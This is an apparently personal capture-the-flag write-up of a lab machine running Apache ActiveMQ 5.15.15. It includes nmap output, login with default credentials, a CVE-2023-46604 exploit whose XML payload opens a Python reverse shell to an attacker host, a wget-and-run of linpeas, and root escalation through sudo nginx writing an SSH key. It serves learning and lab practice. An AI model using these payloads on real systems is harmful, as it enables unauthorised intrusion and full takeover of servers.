```
PORT STATE SERVICE REASON VERSION

22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey:

| 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)

| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=

| 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)

|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM

80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu)

|_http-server-header: nginx/1.18.0 (Ubuntu)

| http-auth:

| HTTP/1.1 401 Unauthorized\x0D

|_ basic realm=ActiveMQRealm

|_http-title: Error 401 Unauthorized

1883/tcp open mqtt syn-ack ttl 63

| mqtt-subscribe:

| Topics and their most recent payloads:

| ActiveMQ/Advisory/Consumer/Topic/#:

|_ ActiveMQ/Advisory/MasterBroker:

5672/tcp open amqp? syn-ack ttl 63

|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65

| fingerprint-strings:

| DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie:

| AMQP

| AMQP

| amqp:decode-error

|_ 7Connection from client using unsupported AMQP attempted

8161/tcp open http syn-ack ttl 63 Jetty 9.4.39.v20210325

| http-auth:

| HTTP/1.1 401 Unauthorized\x0D

|_ basic realm=ActiveMQRealm

|_http-title: Error 401 Unauthorized

|_http-server-header: Jetty(9.4.39.v20210325)

40307/tcp open tcpwrapped syn-ack ttl 63

61613/tcp open stomp syn-ack ttl 63 Apache ActiveMQ

| fingerprint-strings:

| HELP4STOMP:

| ERROR

| content-type:text/plain

| message:Unknown STOMP action: HELP

| org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP

| org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)

| org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)

| org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)

| org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)

| org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)

|_ java.lang.Thread.run(Thread.java:750)

61614/tcp open http syn-ack ttl 63 Jetty 9.4.39.v20210325

|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E

| http-methods:

| Supported Methods: GET HEAD TRACE OPTIONS

|_ Potentially risky methods: TRACE

|_http-title: Site doesn't have a title.

|_http-server-header: Jetty(9.4.39.v20210325)

61616/tcp open apachemq syn-ack ttl 63 ActiveMQ OpenWire transport

| fingerprint-strings:

| GenericLines, GetRequest, HTTPOptions, NULL, RTSPRequest:

| ActiveMQ

| TcpNoDelayEnabled

| SizePrefixDisabled

| CacheSize

| ProviderName

| ActiveMQ

| StackTraceEnabled

| PlatformDetails

| Java

| CacheEnabled

| TightEncodingEnabled

| MaxFrameSize

| MaxInactivityDuration

| MaxInactivityDurationInitalDelay

| ProviderVersion

|_ 5.15.15
```

# port 80
requires basicauth
admin:admin works to log in
This port runs Apache ActiveMQ, which is a message broker. A message broker takes a message from a service, transforms it into another format and sends it to another service, reducing the awareness that the two services have to have about each other.

Clicking on manage ActiveMQ broker sends us to the next interface where we can find the version: 5.15.15
Checking the version shows that there is a severe CVE for this. This blog shows the details:
https://www.trendmicro.com/en_us/research/23/k/cve-2023-46604-exploited-by-kinsing.html

```
https://github.com/NKeshawarz/CVE-2023-46604-RCE
```

modify the poc.xml to look like this, I'm using a python revshell here:
```
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg >
            <list>
                <value>/bin/bash</value>
                <value>-c</value>
                <value>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno()>
            </list>
            </constructor-arg>
        </bean>
    </beans>


```

start a server and listener in the folder with the poc:
```
sudo nc -lnvp 9001
sudo python3 -m http.server 80
```

fire the exploit like this:
```
python3 CVE-2023-46604-RCE.py -i <targetIP> -p 61616 -u http://<attackboxIP>/poc.xml
```

this gives me a shell as activemq
now head to the activemq home folder and grab the user flag.

# PE

Hosting linpeas from my box, grab it like this:
```
wget http://<ip>:80/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```

checking sudo -l :
```
sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx

```

```
https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406
```

We can simply follow the steps in the github repo. Create a malicious config that runs as root and listens for PUT requests on port 1339. Files created this way will be owned by root. Then create a SSH key, and upload it via nginx to the authorized keys file. Now we can grab the ssh key, put it in a file and run 
ssh root@ip -i id_rsa.pub to get root. 
